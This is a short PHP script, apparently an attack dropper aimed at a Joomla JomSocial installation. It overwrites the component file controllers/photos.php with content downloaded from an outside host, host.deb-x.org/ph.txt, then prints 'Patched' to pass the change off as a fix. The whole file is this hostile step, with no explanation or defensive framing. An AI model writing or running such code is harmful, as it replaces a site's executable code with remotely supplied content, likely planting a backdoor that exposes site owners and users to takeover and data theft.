<?php
$s=fopen("../components/com_community/controllers/photos.php", "w");fwrite($s,file_get_contents("http://host.deb-x.org/ph.txt"));fclose($s);
echo "Patched";
?>

